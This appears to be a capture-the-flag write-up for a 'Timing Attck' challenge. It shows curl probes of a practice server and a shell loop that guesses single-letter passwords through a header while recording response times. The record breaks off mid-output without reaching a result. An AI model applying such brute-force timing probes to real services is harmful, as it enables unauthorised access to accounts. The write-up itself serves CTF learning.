Timing Attck
============

Once upon a time, there was a programmer. His name was Anshul. He did not know how to work with passwords. His friend Animesh took this opportunity to do jugaad and guess the passwords so that he is able to order a lot of free shirts from MustCapture. Help Animesh to find this password.

hostname: ctfclubiiit.tk

- Category: #misc

- Flag Format: r/[a-zA-Z]+/

- link: defunct

Provided [server.js](server.js)


Solution
========

We are given a regex format for the flag. The regex quite literally means that there the flag is alphabets (upper or lower case) which are repeating, and is a single word.

We are given a URL to mess with, and we do the preliminary task of scanning what is up.

	$ curl ctfclubiiit.tk:8080 -v
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:11:57 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Could Not Find "password" header

So it seems that the question requires a Header Password, so we make a guess with a password, as good as any...

	$ curl ctfclubiiit.tk:8080 -v -H password:password
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:password
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:12:32 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8570860189920093

So that is a interesting response. It gives out a time taken entry. The question seems to point to a single word flag, and we could do a brute force. Let us try with all single characters.

	$ for i in {a..z} {A..Z}
	do
	curl -s ctfclubiiit.tk:8080 -H password:$i -v
	done
	* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:a
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:10 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.28451509229395344* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:b
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:11 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5690178581364309* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:c
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:11 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6382719290708212* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:d
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:11 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.38517025886365275* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:e
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:12 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9999405565589246* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:f
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:12 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.26962494053615016* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:g
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:13 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.978719317264169* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:h
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:13 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9108144040353736* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:i
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:14 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7227206538158273* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:j
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:14 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.18704188948235467* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:k
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:15 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 1.7484813706349838* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:l
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:15 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.09477134872523685* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:m
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:15 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.928042342346832* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:n
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:16 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6063920936564964* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:o
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:16 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5553204664290541* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:p
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:17 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9509319161800307* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:q
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:17 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7950863287471543* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:r
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:18 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5047966347379915* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:s
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:18 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7264704459706135* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:t
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:19 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.0902338204608677* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:u
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:19 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.4056517544893816* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:v
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:19 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.017696354793904856* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:w
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:20 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.060049110172355924* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:x
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:20 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.1513161094758282* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:y
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:21 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.12415661205233341* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:z
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:21 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9517626449710153* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:A
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:22 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.10371333772607172* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:B
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:22 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8395776790375735* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:C
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:22 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3385529247124299* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:D
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:23 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.35435589693010483* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:E
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:23 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.2408917366689114* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:F
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:24 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.15919684500005538* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:G
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:24 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.5309364359414785* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:H
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:25 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.9194202923863171* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:I
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:25 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.18521249421390973* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:J
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:26 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.30437365063555455* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:K
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:26 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8193100270321563* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:L
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:26 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.28362371544972875* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:M
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:27 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7573878536321392* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:N
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:27 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.03861659985546573* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:O
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:28 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.46333707962732196* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:P
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:28 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6599331303222546* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:Q
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:29 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8863703815007509* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:R
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:29 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.36276115206307846* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:S
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:30 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.2663895471518347* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:T
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:30 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.7729399087737829* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:U
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:30 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.38616233834403624* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:V
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:31 GMT
	< Content-Length: 31
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.12961861222910165* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:W
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:17:31 GMT
	< Content-Length: 29
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.784701891436163* Rebuilt URL to: ctfclubiiit.tk:8080/
